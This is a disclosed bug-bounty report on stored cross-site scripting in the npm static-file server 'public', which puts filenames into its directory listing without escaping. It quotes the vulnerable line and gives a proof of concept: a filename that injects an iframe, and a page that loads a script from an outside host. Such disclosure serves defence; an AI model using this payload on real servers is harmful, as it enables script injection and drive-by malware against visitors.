# [public] Stored XSS in filenames in directory served by public

## Report Details
- **Report ID**: 316346
- **URL**: https://hackerone.com/reports/316346
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-02-15T08:03:19.889Z
- **Disclosed**: 2018-04-15T18:32:14.574Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

**public** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

**I put https://www.npmjs.com/package/public in Weakness section - 'Where is the stored content accessible?*' because it does not allowed me to open report with http://localhost:8000 - so it's only a placeholder and does not contain any vulnerability!!!**


## Module

**public**

Run static file hosting server with specified public dir & port. Support a "direcotry index" like Apache httpd.

https://www.npmjs.com/package/public

version: 0.1.3

Stats
2 downloads in the last day
28 downloads in the last week
222 downloads in the last month

~2600 estimated downloads per year


## Description

This vulnerability exists, because ```file``` which represents filename(s) is output in HTML without any sanitization. 
This allows to embed malicious code in filenames listed in directory.

```javascript
// node_modules/public/bin/public, line 106:
        files.forEach(function(file) {
            list.push('<li><a href="', path.join(base, file),'">', file, '</a></li>');
        });
```
## PoC - Steps To Reproduce:

- install ```public```

```
$ npm install public
```


- in the directory which will be served via ```public```, create file with following name:

```
"><iframe src="malware_frame.html">
```

- create second file with name ```malware_frame.html``` with following content and save it in the same directory:


```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

Run ```public`` in directory with file with changed filename:

```
$ ./node_modules/public/bin/public ./ 8000
Public.js server running with "/Users/bl4de/playground/node_bugbounty_playground" on port 8000
```

and open ```http://127.0.0.1:8000``` in the browser:

{F263608}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- Chromium 66.0.3342.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://www.npmjs.com/package/public

**Verified**
Yes



## Attachments
- 1.png
